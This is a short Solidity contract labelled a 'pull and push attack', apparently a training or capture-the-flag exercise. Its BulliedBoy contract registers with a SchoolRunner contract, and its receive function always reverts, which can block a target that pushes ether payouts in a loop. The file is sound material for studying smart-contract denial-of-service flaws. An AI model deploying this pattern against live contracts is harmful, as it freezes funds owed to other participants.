// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "../bullied-boy/SchoolRunner.sol";

// pull and push attack
contract BulliedBoy {
    
    function bully(address payable _schoolRunner) public {
        SchoolRunner schoolRunner = SchoolRunner(_schoolRunner);
        schoolRunner.register();
    }


    receive() external payable {
        revert("I'm not a bully!");
    }
}